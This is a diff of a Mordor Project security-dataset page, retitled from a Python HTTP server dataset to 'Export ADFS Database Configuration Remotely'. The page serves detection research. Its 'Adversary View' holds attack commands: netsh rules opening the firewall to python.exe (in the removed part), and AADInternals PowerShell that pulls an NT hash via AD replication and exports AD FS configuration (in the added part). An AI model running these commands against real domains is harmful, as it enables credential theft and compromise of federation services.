@@ -6,7 +6,7 @@
   <head>
     <meta charset="utf-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Python HTTP Server &#8212; The Mordor Project</title>
+    <title>Export ADFS Database Configuration Remotely &#8212; The Mordor Project</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.11.2/css/all.min.css" integrity="sha384-KA6wR/X5RY4zFAHpv/CnoG2UW1uogYfdnP67Uv7eULvTveboZJg0qUpmJZb5VqzN" crossorigin="anonymous">
     <link href="../../../../_static/css/index.css" rel="stylesheet">
     <link rel="stylesheet" href="../../../../_static/sphinx-book-theme.css" type="text/css" />
@@ -33,22 +33,22 @@
         const thebe_selector_output = ".output,.cell_output"
     </script>
     <script async="async" src="../../../../_static/sphinx-thebe.js"></script>
-    <link rel="canonical" href="https://mordordatasets.com/notebooks/small/windows/02_execution/SDWIN-201029001615.html" />
+    <link rel="canonical" href="https://mordordatasets.com/notebooks/small/windows/08_lateral_movement/SDWIN-210427020247.html" />
     <link rel="shortcut icon" href="../../../../_static/favicon.ico"/>
     <link rel="index" title="Index" href="../../../../genindex.html" />
     <link rel="search" title="Search" href="../../../../search.html" />
-    <link rel="next" title="Exchange ProxyLogon SSRF RCE Vuln POC" href="SDWIN-210314014019.html" />
-    <link rel="prev" title="Remote Scheduled Task Creation" href="SDWIN-201219070027.html" />
+    <link rel="next" title="DCOM ExecuteExcel4macro" href="SDWIN-200917174542.html" />
+    <link rel="prev" title="Covenant SharpSC Query" href="SDWIN-200806012009.html" />
 
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <meta name="docsearch:language" content="en">
 
 
 <!-- Opengraph tags -->
-<meta property="og:url"         content="https://mordordatasets.com/notebooks/small/windows/02_execution/SDWIN-201029001615.html" />
+<meta property="og:url"         content="https://mordordatasets.com/notebooks/small/windows/08_lateral_movement/SDWIN-210427020247.html" />
 <meta property="og:type"        content="article" />
-<meta property="og:title"       content="Python HTTP Server" />
-<meta property="og:description" content="Python HTTP Server  Metadata          Author  Roberto Rodriguez @Cyb3rWard0g  Creation Date  2020/10/29  Modification Date  2020/10/29  Tactics  [‘TA0002’]  Tec" />
+<meta property="og:title"       content="Export ADFS Database Configuration Remotely" />
+<meta property="og:description" content="Export ADFS Database Configuration Remotely  Metadata          Author  Roberto Rodriguez @Cyb3rWard0g  Creation Date  2021/04/27  Modification Date  2021/04/27 " />
 <meta property="og:image"       content="https://mordordatasets.com/_static/logo.png" />
 
 <meta name="twitter:card" content="summary" />
@@ -132,98 +132,98 @@
    Windows
   </a>
   <ul class="current">
-   <li class="toctree-l2 current active">
-    <a class="reference internal" href="execution.html">
+   <li class="toctree-l2">
+    <a class="reference internal" href="../02_execution/execution.html">
      Execution
     </a>
-    <ul class="current">
+    <ul>
      <li class="toctree-l3">
-      <a class="reference internal" href="SDWIN-200806115603.html">
+      <a class="reference internal" href="../02_execution/SDWIN-200806115603.html">
        Covenant PowerShell Remoting Command
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="SDWIN-201029202324.html">
+      <a class="reference internal" href="../02_execution/SDWIN-201029202324.html">
        SharpView PCRE.NET
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="SDWIN-201009173318.html">
+      <a class="reference internal" href="../02_execution/SDWIN-201009173318.html">
        Covenant Remote WMI Wbemcomn DLL Hijacking
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="SDWIN-200806035621.html">
+      <a class="reference internal" href="../02_execution/SDWIN-200806035621.html">
        Covenant SharpWMI Exec
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="SDWIN-201219075059.html">
+      <a class="reference internal" href="../02_execution/SDWIN-201219075059.html">
        Remote Scheduled Task Modification
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="SDWIN-190518211456.html">
+      <a class="reference internal" href="../02_execution/SDWIN-190518211456.html">
        Empire Invoke PSRemoting
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="SDWIN-201219070027.html">
+      <a class="reference internal" href="../02_execution/SDWIN-201219070027.html">
        Remote Scheduled Task Creation
       </a>
      </li>
-     <li class="toctree-l3 current active">
-      <a class="current reference internal" href="#">
+     <li class="toctree-l3">
+      <a class="reference internal" href="../02_execution/SDWIN-201029001615.html">
        Python HTTP Server
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="SDWIN-210314014019.html">
+      <a class="reference internal" href="../02_execution/SDWIN-210314014019.html">
        Exchange ProxyLogon SSRF RCE Vuln POC
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="SDWIN-190518211052.html">
+      <a class="reference internal" href="../02_execution/SDWIN-190518211052.html">
        Empire Invoke DCOM ShellWindows
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="SDWIN-200724174200.html">
+      <a class="reference internal" href="../02_execution/SDWIN-200724174200.html">
        Covenant Remote WMI Eventing ActiveScriptEventConsumers
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="SDWIN-190518210652.html">
+      <a class="reference internal" href="../02_execution/SDWIN-190518210652.html">
        Empire Invoke PsExec
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="SDWIN-201102041306.html">
+      <a class="reference internal" href="../02_execution/SDWIN-201102041306.html">
        PowerShell HTTP Listener
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="SDWIN-190518213907.html">
+      <a class="reference internal" href="../02_execution/SDWIN-190518213907.html">
        Empire Invoke Execute MSBuild
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="SDWIN-200914080546.html">
+      <a class="reference internal" href="../02_execution/SDWIN-200914080546.html">
        Empire Remote WMIC Add User
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="SDWIN-200921001437.html">
+      <a class="reference internal" href="../02_execution/SDWIN-200921001437.html">
        Empire Invoke WMI
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="SDWIN-190518182022.html">
+      <a class="reference internal" href="../02_execution/SDWIN-190518182022.html">
        Empire VBS Execution
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="SDWIN-191027223020.html">
+      <a class="reference internal" href="../02_execution/SDWIN-191027223020.html">
        Covenant ShellCmd InstallUtil
       </a>
      </li>
@@ -649,138 +649,138 @@
      </li>
     </ul>
    </li>
-   <li class="toctree-l2">
-    <a class="reference internal" href="../08_lateral_movement/lateral_movement.html">
+   <li class="toctree-l2 current active">
+    <a class="reference internal" href="lateral_movement.html">
      Lateral Movement
     </a>
-    <ul>
+    <ul class="current">
      <li class="toctree-l3">
-      <a class="reference internal" href="../08_lateral_movement/SDWIN-190518210125.html">
+      <a class="reference internal" href="SDWIN-190518210125.html">
        Empire Invoke SMBExec
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="../08_lateral_movement/SDWIN-200806115603.html">
+      <a class="reference internal" href="SDWIN-200806115603.html">
        Covenant PowerShell Remoting Command
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="../08_lateral_movement/SDWIN-201009173318.html">
+      <a class="reference internal" href="SDWIN-201009173318.html">
        Covenant Remote WMI Wbemcomn DLL Hijacking
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="../08_lateral_movement/SDWIN-200918145959.html">
+      <a class="reference internal" href="SDWIN-200918145959.html">
        DCOM RegisterXLL
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="../08_lateral_movement/SDWIN-200806035621.html">
+      <a class="reference internal" href="SDWIN-200806035621.html">
        Covenant SharpWMI Exec
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="../08_lateral_movement/SDWIN-201219075059.html">
+      <a class="reference internal" href="SDWIN-201219075059.html">
        Remote Scheduled Task Modification
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="../08_lateral_movement/SDWIN-201022042947.html">
+      <a class="reference internal" href="SDWIN-201022042947.html">
        PurpleSharp Active Directory Playbook I
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="../08_lateral_movement/SDWIN-200806030120.html">
+      <a class="reference internal" href="SDWIN-200806030120.html">
        Covenant SharpSC Start
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="../08_lateral_movement/SDWIN-200806015757.html">
+      <a class="reference internal" href="SDWIN-200806015757.html">
        Covenant Remote File Copy
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="../08_lateral_movement/SDWIN-190518211456.html">
+      <a class="reference internal" href="SDWIN-190518211456.html">
        Empire Invoke PSRemoting
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="../08_lateral_movement/SDWIN-201219070027.html">
+      <a class="reference internal" href="SDWIN-201219070027.html">
        Remote Scheduled Task Creation
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="../08_lateral_movement/SDWIN-200806022635.html">
+      <a class="reference internal" href="SDWIN-200806022635.html">
        Covenant SharpSC Create
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="../08_lateral_movement/SDWIN-201009183000.html">
+      <a class="reference internal" href="SDWIN-201009183000.html">
        Covenant Remote DCOM Iertutil DLL Hijacking
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="../08_lateral_movement/SDWIN-190319131123.html">
+      <a class="reference internal" href="SDWIN-190319131123.html">
        Empire Over-Pass-The-Hash
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="../08_lateral_movement/SDWIN-200806031938.html">
+      <a class="reference internal" href="SDWIN-200806031938.html">
        Covenant SharpSC Stop Service
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="../08_lateral_movement/SDWIN-190518211052.html">
+      <a class="reference internal" href="SDWIN-190518211052.html">
        Empire Invoke DCOM ShellWindows
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="../08_lateral_movement/SDWIN-200724174200.html">
+      <a class="reference internal" href="SDWIN-200724174200.html">
        Covenant Remote WMI Eventing ActiveScriptEventConsumers
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="../08_lateral_movement/SDWIN-190518210652.html">
+      <a class="reference internal" href="SDWIN-190518210652.html">
        Empire Invoke PsExec
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="../08_lateral_movement/SDWIN-200806012009.html">
+      <a class="reference internal" href="SDWIN-200806012009.html">
        Covenant SharpSC Query
       </a>
      </li>
-     <li class="toctree-l3">
-      <a class="reference internal" href="../08_lateral_movement/SDWIN-210427020247.html">
+     <li class="toctree-l3 current active">
+      <a class="current reference internal" href="#">
        Export ADFS Database Configuration Remotely
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="../08_lateral_movement/SDWIN-200917174542.html">
+      <a class="reference internal" href="SDWIN-200917174542.html">
        DCOM ExecuteExcel4macro
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="../08_lateral_movement/SDWIN-200805034820.html">
+      <a class="reference internal" href="SDWIN-200805034820.html">
        Covenant SC.exe Utility Query
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="../08_lateral_movement/SDWIN-190518213907.html">
+      <a class="reference internal" href="SDWIN-190518213907.html">
        Empire Invoke Execute MSBuild
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="../08_lateral_movement/SDWIN-200914080546.html">
+      <a class="reference internal" href="SDWIN-200914080546.html">
        Empire Remote WMIC Add User
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="../08_lateral_movement/SDWIN-200916232559.html">
+      <a class="reference internal" href="SDWIN-200916232559.html">
        Mimikatz Netlogon Unauthenticated NetrServerAuthenticate2
       </a>
      </li>
      <li class="toctree-l3">
-      <a class="reference internal" href="../08_lateral_movement/SDWIN-200921001437.html">
+      <a class="reference internal" href="SDWIN-200921001437.html">
        Empire Invoke WMI
       </a>
      </li>
@@ -862,7 +862,7 @@
         <!-- ipynb file if we had a myst markdown file -->
         
         <!-- Download raw file -->
-        <a class="dropdown-buttons" href="../../../../_sources/notebooks/small/windows/02_execution/SDWIN-201029001615.ipynb"><button type="button"
+        <a class="dropdown-buttons" href="../../../../_sources/notebooks/small/windows/08_lateral_movement/SDWIN-210427020247.ipynb"><button type="button"
                 class="btn btn-secondary topbarbtn" title="Download source file" data-toggle="tooltip"
                 data-placement="left">.ipynb</button></a>
         <!-- Download PDF via print -->
@@ -882,10 +882,10 @@
                 data-toggle="tooltip" data-placement="left" title="Source repository"><i
                     class="fab fa-github"></i>repository</button></a>
         <a class="issues-button"
-            href="https://github.com/OTRF/mordor/issues/new?title=Issue%20on%20page%20%2Fnotebooks/small/windows/02_execution/SDWIN-201029001615.html&body=Your%20issue%20content%20here."><button
+            href="https://github.com/OTRF/mordor/issues/new?title=Issue%20on%20page%20%2Fnotebooks/small/windows/08_lateral_movement/SDWIN-210427020247.html&body=Your%20issue%20content%20here."><button
                 type="button" class="btn btn-secondary topbarbtn" data-toggle="tooltip" data-placement="left"
                 title="Open an issue"><i class="fas fa-lightbulb"></i>open issue</button></a>
-        <a class="edit-button" href="https://github.com/OTRF/mordor/edit/master/docs/notebooks/small/windows/02_execution/SDWIN-201029001615.ipynb"><button
+        <a class="edit-button" href="https://github.com/OTRF/mordor/edit/master/docs/notebooks/small/windows/08_lateral_movement/SDWIN-210427020247.ipynb"><button
                 type="button" class="btn btn-secondary topbarbtn" data-toggle="tooltip" data-placement="left"
                 title="Edit this page"><i class="fas fa-pencil-alt"></i>suggest edit</button></a>
     </div>
@@ -904,7 +904,7 @@
         aria-label="Launch interactive content"><i class="fas fa-rocket"></i></button>
     <div class="dropdown-buttons">
         
-        <a class="binder-button" href="https://mybinder.org/v2/gh/OTRF/mordor/master?urlpath=tree/docs/notebooks/small/windows/02_execution/SDWIN-201029001615.ipynb"><button type="button"
+        <a class="binder-button" href="https://mybinder.org/v2/gh/OTRF/mordor/master?urlpath=tree/docs/notebooks/small/windows/08_lateral_movement/SDWIN-210427020247.ipynb"><button type="button"
                 class="btn btn-secondary topbarbtn" title="Launch Binder" data-toggle="tooltip"
                 data-placement="left"><img class="binder-button-logo"
                     src="../../../../_static/images/logo_binder.svg"
@@ -912,7 +912,7 @@
         
         
         
-        <a class="colab-button" href="https://colab.research.google.com/github/OTRF/mordor/blob/master/docs/notebooks/small/windows/02_execution/SDWIN-201029001615.ipynb"><button type="button" class="btn btn-secondary topbarbtn"
+        <a class="colab-button" href="https://colab.research.google.com/github/OTRF/mordor/blob/master/docs/notebooks/small/windows/08_lateral_movement/SDWIN-210427020247.ipynb"><button type="button" class="btn btn-secondary topbarbtn"
                 title="Launch Colab" data-toggle="tooltip" data-placement="left"><img class="colab-button-logo"
                     src="../../../../_static/images/logo_colab.png"
                     alt="Interact on Colab">Colab</button></a>
@@ -995,8 +995,8 @@
         
               <div>
                 
-  <div class="section" id="python-http-server">
-<h1>Python HTTP Server<a class="headerlink" href="#python-http-server" title="Permalink to this headline">¶</a></h1>
+  <div class="section" id="export-adfs-database-configuration-remotely">
+<h1>Export ADFS Database Configuration Remotely<a class="headerlink" href="#export-adfs-database-configuration-remotely" title="Permalink to this headline">¶</a></h1>
 <div class="section" id="metadata">
 <h2>Metadata<a class="headerlink" href="#metadata" title="Permalink to this headline">¶</a></h2>
 <table class="colwidths-auto table">
@@ -1010,16 +1010,16 @@
 <td class="text-align:left"><p>Roberto Rodriguez &#64;Cyb3rWard0g</p></td>
 </tr>
 <tr class="row-odd"><td class="text-align:left"><p>Creation Date</p></td>
-<td class="text-align:left"><p>2020/10/29</p></td>
+<td class="text-align:left"><p>2021/04/27</p></td>
 </tr>
 <tr class="row-even"><td class="text-align:left"><p>Modification Date</p></td>
-<td class="text-align:left"><p>2020/10/29</p></td>
+<td class="text-align:left"><p>2021/04/27</p></td>
 </tr>
 <tr class="row-odd"><td class="text-align:left"><p>Tactics</p></td>
-<td class="text-align:left"><p>[‘<a class="reference external" href="https://attack.mitre.org/tactics/TA0002">TA0002</a>’]</p></td>
+<td class="text-align:left"><p>[‘<a class="reference external" href="https://attack.mitre.org/tactics/TA0008">TA0008</a>’]</p></td>
 </tr>
 <tr class="row-even"><td class="text-align:left"><p>Techniques</p></td>
-<td class="text-align:left"><p>[‘<a class="reference external" href="https://attack.mitre.org/techniques/T1059">T1059</a>’]</p></td>
+<td class="text-align:left"><p>[‘<a class="reference external" href="https://attack.mitre.org/techniques/T0000">T0000</a>’]</p></td>
 </tr>
 <tr class="row-odd"><td class="text-align:left"><p>Tags</p></td>
 <td class="text-align:left"><p>None</p></td>
@@ -1029,7 +1029,7 @@
 </div>
 <div class="section" id="dataset-description">
 <h2>Dataset Description<a class="headerlink" href="#dataset-description" title="Permalink to this headline">¶</a></h2>
-<p>This dataset represents threat actors adding a FW inbound rule and starting a Python HTTP Server.</p>
+<p>This dataset represents a threat actor exporting the AD FS database configuration remotely over http.</p>
 </div>
 <div class="section" id="datasets-downloads">
 <h2>Datasets Downloads<a class="headerlink" href="#datasets-downloads" title="Permalink to this headline">¶</a></h2>
@@ -1041,7 +1041,10 @@
 </thead>
 <tbody>
 <tr class="row-even"><td class="text-align:left"><p>Host</p></td>
-<td class="text-align:left"><p><a class="reference external" href="https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/execution/host/psh_python_webserver.zip">https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/execution/host/psh_python_webserver.zip</a></p></td>
+<td class="text-align:left"><p><a class="reference external" href="https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/lateral_movement/host/aadinternals_export_adfsdatabaseconfig_remotely.zip">https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/lateral_movement/host/aadinternals_export_adfsdatabaseconfig_remotely.zip</a></p></td>
+</tr>
+<tr class="row-odd"><td class="text-align:left"><p>Network</p></td>
+<td class="text-align:left"><p><a class="reference external" href="https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/lateral_movement/network/aadinternals_export_adfsdatabaseconfig_remotely.zip">https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/lateral_movement/network/aadinternals_export_adfsdatabaseconfig_remotely.zip</a></p></td>
 </tr>
 </tbody>
 </table>
@@ -1071,27 +1074,22 @@
 </thead>
 <tbody>
 <tr class="row-even"><td class="text-align:left"><p>Lab VM</p></td>
-<td class="text-align:left"><p>Manual</p></td>
-<td class="text-align:left"><p><span class="xref myst">PowerShell</span></p></td>
+<td class="text-align:left"><p>PowerShell Module</p></td>
+<td class="text-align:left"><p><span class="xref myst">Export-AADIntADFSConfiguration</span></p></td>
 </tr>
 </tbody>
 </table>
 </div>
 <div class="section" id="adversary-view">
 <h2>Adversary View<a class="headerlink" href="#adversary-view" title="Permalink to this headline">¶</a></h2>
-<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">Add</span> <span class="n">Firewall</span> <span class="n">Rule</span>
-<span class="o">-----------------</span>
-<span class="n">PS</span> <span class="o">&gt;</span> <span class="o">&amp;</span> <span class="n">netsh</span> <span class="n">advfirewall</span> <span class="n">firewall</span> <span class="n">add</span> <span class="n">rule</span> <span class="n">name</span><span class="o">=</span><span class="s2">&quot;python.exe&quot;</span> <span class="nb">dir</span><span class="o">=</span><span class="ow">in</span> <span class="n">action</span><span class="o">=</span><span class="n">allow</span> <span class="n">description</span><span class="o">=</span><span class="s2">&quot;python.exe&quot;</span> <span class="n">program</span><span class="o">=</span><span class="s2">&quot;C:\users\wardog</span><span class="se">\a</span><span class="s2">ppdata\local\programs\python\python39\python.exe&quot;</span> <span class="n">enable</span><span class="o">=</span><span class="n">yes</span> <span class="n">localport</span><span class="o">=</span><span class="nb">any</span> <span class="n">protocol</span><span class="o">=</span><span class="n">tcp</span> <span class="n">remoteip</span><span class="o">=</span><span class="nb">any</span>
-<span class="n">Ok</span><span class="o">.</span>    
-
-<span class="n">PS</span> <span class="o">&gt;</span> <span class="o">&amp;</span> <span class="n">netsh</span> <span class="n">advfirewall</span> <span class="n">firewall</span> <span class="n">add</span> <span class="n">rule</span> <span class="n">name</span><span class="o">=</span><span class="s2">&quot;python.exe&quot;</span> <span class="nb">dir</span><span class="o">=</span><span class="ow">in</span> <span class="n">action</span><span class="o">=</span><span class="n">allow</span> <span class="n">description</span><span class="o">=</span><span class="s2">&quot;python.exe&quot;</span> <span class="n">program</span><span class="o">=</span><span class="s2">&quot;C:\users\wardog</span><span class="se">\a</span><span class="s2">ppdata\local\programs\python\python39\python.exe&quot;</span> <span class="n">enable</span><span class="o">=</span><span class="n">yes</span> <span class="n">localport</span><span class="o">=</span><span class="nb">any</span> <span class="n">protocol</span><span class="o">=</span><span class="n">udp</span> <span class="n">remoteip</span><span class="o">=</span><span class="nb">any</span>
-<span class="n">Ok</span><span class="o">.</span>
-
-<span class="n">Start</span> <span class="n">HTTP</span> <span class="n">Server</span>
-<span class="o">-----------------</span>
-<span class="n">PS</span> <span class="o">&gt;</span> <span class="n">python</span> <span class="o">-</span><span class="n">m</span> <span class="n">http</span><span class="o">.</span><span class="n">server</span> <span class="mi">8000</span>
-
-<span class="n">Serving</span> <span class="n">HTTP</span> <span class="n">on</span> <span class="p">::</span> <span class="n">port</span> <span class="mi">8000</span> <span class="p">(</span><span class="n">http</span><span class="p">:</span><span class="o">//</span><span class="p">[::]:</span><span class="mi">8000</span><span class="o">/</span><span class="p">)</span> <span class="o">...</span>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span># ADFS Service Account
+$UserObjectGUID = &#39;d1713029-72e2-4101-8486-1db074944f23&#39;
+# Domain Admin credentials
+$credentials = get-credential
+# Get Hash via AD replication
+$Hash = Get-AADIntADUserNTHash -ObjectGuid $UserObjectGUID -Credentials $credentials -Server &#39;DC01.blacksmith.local&#39; -AsHex
+# Retrieve AD FS database configuration over HTTP
+$ADFSDatabaseConfig = Export-AADIntADFSConfiguration -Hash &#39;97bff5626068f351a5f9891b97b04640&#39; -SID &#39;S-1-5-21-3226634481-2224579835-4276826623-1103&#39; -Server ADFS01.blacksmith.local
 </pre></div>
 </div>
 </div>
@@ -1112,15 +1110,8 @@
 <h3>Download &amp; Process Mordor File<a class="headerlink" href="#download-process-mordor-file" title="Permalink to this headline">¶</a></h3>
 <div class="cell docutils container">
 <div class="cell_input docutils container">
-<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">mordor_file</span> <span class="o">=</span> <span class="s2">&quot;https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/execution/host/psh_python_webserver.zip&quot;</span>
+<div class="highlight-ipython3 notranslate"><div class="highlight"><pre><span></span><span class="n">mordor_file</span> <span class="o">=</span> <span class="s2">&quot;https://raw.githubusercontent.com/OTRF/mordor/master/datasets/small/windows/lateral_movement/host/aadinternals_export_adfsdatabaseconfig_remotely.zip&quot;</span>
 <span class="n">registerMordorSQLTable</span><span class="p">(</span><span class="n">spark</span><span class="p">,</span> <span class="n">mordor_file</span><span class="p">,</span> <span class="s2">&quot;mordorTable&quot;</span><span class="p">)</span>
-</pre></div>
-</div>
-</div>
-<div class="cell_output docutils container">
-<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>[+] Processing a Spark DataFrame..
-[+] DataFrame Returned !
-[+] Temporary SparkSQL View: mordorTable 
 </pre></div>
 </div>
 </div>
@@ -1142,34 +1133,6 @@
 </pre></div>
 </div>
 </div>
-<div class="cell_output docutils container">
-<div class="output stream highlight-myst-ansi notranslate"><div class="highlight"><pre><span></span>+------------+------------------------------------+-------+-----+
-|Hostname    |Channel                             |EventID|count|
-+------------+------------------------------------+-------+-----+
-|WORKSTATION5|Security                            |4658   |642  |
-|WORKSTATION5|Microsoft-Windows-Sysmon/Operational|10     |451  |
-|WORKSTATION5|Security                            |4656   |322  |
-|WORKSTATION5|Security                            |4663   |320  |
-|WORKSTATION5|Security                            |4690   |320  |
-|WORKSTATION5|Microsoft-Windows-Sysmon/Operational|7      |254  |
-|WORKSTATION5|Microsoft-Windows-Sysmon/Operational|12     |28   |
-|WORKSTATION5|Microsoft-Windows-Sysmon/Operational|13     |23   |
-|WORKSTATION5|Security                            |5447   |8    |
-|WORKSTATION5|Microsoft-Windows-Sysmon/Operational|11     |4    |
-|WORKSTATION5|Security                            |5158   |4    |
-|WORKSTATION5|Security                            |5156   |4    |
-|WORKSTATION5|Microsoft-Windows-Sysmon/Operational|1      |3    |
-|WORKSTATION5|Security                            |4688   |3    |
-|WORKSTATION5|Security                            |4946   |2    |
-|WORKSTATION5|Security                            |4689   |2    |
-|WORKSTATION5|Microsoft-Windows-Sysmon/Operational|5      |2    |
-|WORKSTATION5|Security                            |5154   |1    |
-|WORKSTATION5|Microsoft-Windows-Sysmon/Operational|22     |1    |
-|WORKSTATION5|Security                            |1102   |1    |
-+------------+------------------------------------+-------+-----+
-</pre></div>
-</div>
-</div>
 </div>
 </div>
 </div>
@@ -1188,7 +1151,7 @@
         },
         kernelOptions: {
             kernelName: "pyspark3",
-            path: "./notebooks/small/windows/02_execution"
+            path: "./notebooks/small/windows/08_lateral_movement"
         },
         predefinedOutput: true
     }
@@ -1203,8 +1166,8 @@
     
     <div class='prev-next-bottom'>
         
-    <a class='left-prev' id="prev-link" href="SDWIN-201219070027.html" title="previous page">Remote Scheduled Task Creation</a>
-    <a class='right-next' id="next-link" href="SDWIN-210314014019.html" title="next page">Exchange ProxyLogon SSRF RCE Vuln POC</a>
+    <a class='left-prev' id="prev-link" href="SDWIN-200806012009.html" title="previous page">Covenant SharpSC Query</a>
+    <a class='right-next' id="next-link" href="SDWIN-200917174542.html" title="next page">DCOM ExecuteExcel4macro</a>
 
     </div>
     <footer class="footer mt-5 mt-md-0">
